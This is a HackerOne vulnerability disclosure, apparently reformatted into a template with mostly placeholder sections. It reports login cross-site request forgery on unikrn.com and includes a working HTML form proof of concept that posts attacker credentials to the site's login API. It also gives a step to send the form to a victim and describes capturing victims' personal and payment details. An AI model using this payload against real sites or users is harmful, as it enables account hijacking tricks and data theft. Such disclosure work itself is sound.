# CSRF logs the victim into attacker's account

## Metadata
- **Source:** HackerOne
- **Report:** 339352 | https://hackerone.com/reports/339352
- **Submitted:** 2018-04-17
- **Reporter:** albatraoz
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Description: There is no session validation while logging in which leads to csrf.

Steps To Reproduce:

  1. Create a CSRF login POC using the following code.
<html>
  <body>
    <form action="https://unikrn.com/apiv1/login" method="POST">
	  <input type="hidden" name="usr" value="[email]">
	  <input type="hidden" name="pwd" value="[password]">
      <input type="submit" value="Submit request" />


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Description: There is no session validation while logging in which leads to csrf.

Steps To Reproduce:

  1. Create a CSRF login POC using the following code.
<html>
  <body>
    <form action="https://unikrn.com/apiv1/login" method="POST">
	  <input type="hidden" name="usr" value="[email]">
	  <input type="hidden" name="pwd" value="[password]">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
  
  2. Replace the email and password with the valid credentials.
  3. Send the script to the victim to make them click.

References:

1. You've rewarded a guy for login csrf here: https://hackerone.com/reports/293016
2. Impact of login csrf on a company: https://support.detectify.com/customer/portal/articles/1969819-login-csrf

## Impact

1. Log any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password and can also monitor the victim activities. 
2. Also the victim may add his paymet info in the attackers account unknowingly using your wallet feature.

The hacker selected the **Cross-Site Request Forgery (CSRF)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://unikrn.com/apiv1/login

**Verified**
Yes

**Can a victim be forced to perform a sensitive state-change operation unknowningly?**
Yes

**What state-change operation can be performed?**
Any user details.

</details>

---
*Analysed by Claude on 2026-05-24*
